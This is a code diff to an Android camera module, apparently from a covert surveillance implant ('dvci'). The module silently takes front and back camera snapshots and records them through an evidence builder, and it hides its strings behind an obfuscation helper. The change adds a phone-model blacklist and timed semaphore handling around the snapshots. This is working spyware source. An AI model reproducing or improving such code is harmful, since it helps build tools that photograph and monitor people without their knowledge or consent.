@@ -9,12 +9,8 @@
 
 package com.android.dvci.module;
 
-import android.content.pm.PackageManager;
 import android.hardware.Camera;
-import android.os.AsyncTask;
 import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
 
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -28,7 +24,6 @@ import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
 import java.io.IOException;
-import java.util.concurrent.Callable;
 import java.util.concurrent.TimeUnit;
 
 //MANUAL http://developer.android.com/guide/topics/media/camera.html
@@ -41,6 +36,21 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	int counter = 0;
+	private String[] blacklistedPhones = {
+			M.e("LG-D405")
+	};
+
+	public ModuleCamera() {
+		super();
+		for ( String model: blacklistedPhones) {
+			if (Build.MODEL.equalsIgnoreCase(model)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
+				}
+				EvidenceBuilder.info(M.e("camera module not supported on this phone"));
+			}
+		}
+	}
 
 	public static ModuleCamera self() {
 		return (ModuleCamera) ManagerModule.self().get(M.e("camera"));
@@ -59,7 +69,7 @@ public class ModuleCamera extends BaseInstantModule {
 
 		//boolean force = conf.getBoolean("force", false);
 		//face = conf.getBoolean("face", false);
-
+		clearStop();
 		return Status.self().haveCamera();
 	}
 
@@ -73,8 +83,18 @@ public class ModuleCamera extends BaseInstantModule {
 				}
 				return;
 			}*/
+
 			if(haveStops()){
 				return;
+			}
+			for ( String model: blacklistedPhones) {
+				if (Build.MODEL.equalsIgnoreCase(model)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
+					}
+					addStop(Status.STOP_REASON_PHONE_MODEL);
+					return;
+				}
 			}
 			if(CameraSnapshot.self().getCamera_killed() <= CameraSnapshot.MAX_CAMERA_KILLS) {
 				snapshot();
@@ -102,20 +122,39 @@ public class ModuleCamera extends BaseInstantModule {
 
 		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
 			final CameraSnapshot camera = CameraSnapshot.self();
-
-			if (Status.self().semaphoreMediaserver.tryAcquire()) {
-				try{
-					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
-				} finally {
-					Status.self().semaphoreMediaserver.release();
+			try {
+				if (Status.self().semaphoreMediaserver.tryAcquire(2000, TimeUnit.MILLISECONDS)) {
+					try {
+						camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
+					} finally {
+						Status.self().semaphoreMediaserver.release();
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (failed to get sem for Front snapshot)");
+					}
+				}
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (failed to get sem for Front snapshot) INTERRUPTED");
 				}
 			}
 			Utils.sleep(100);
-			if (Status.self().semaphoreMediaserver.tryAcquire()) {
-				try{
-					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
-				} finally {
-					Status.self().semaphoreMediaserver.release();
+			try {
+				if (Status.self().semaphoreMediaserver.tryAcquire(2000, TimeUnit.MILLISECONDS)) {
+					try {
+						camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
+					} finally {
+						Status.self().semaphoreMediaserver.release();
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (failed to get sem for Back snapshot)");
+					}
+				}
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (failed to get sem for Back snapshot) INTERRUPTED");
 				}
 			}
 
